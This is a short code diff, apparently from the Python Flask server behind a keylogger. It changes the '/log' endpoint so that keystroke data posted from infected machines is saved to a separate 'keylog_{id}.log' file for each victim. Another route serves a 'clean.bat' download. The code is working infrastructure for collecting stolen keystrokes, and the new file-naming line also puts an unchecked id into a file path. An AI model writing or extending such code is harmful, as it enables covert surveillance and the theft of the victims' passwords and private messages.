@@ -219,10 +219,10 @@ def clean():
     path = os.path.join(CURRENT_DIR, "clean.bat")
     return send_from_directory(CURRENT_DIR, "clean.bat", as_attachment=True) if os.path.exists(path) else abort(404)
 
-@app.route("/log", methods=["POST"])
-def log():
+@app.route("/log/<id>", methods=["POST"])
+def log(id):
     raw = request.form.get("data", "")
-    with open("keylog.log", "a", encoding="utf-8") as f:
+    with open(f"keylog_{id}.log", "a", encoding="utf-8") as f:
         f.write(raw)
     return "OK"
 
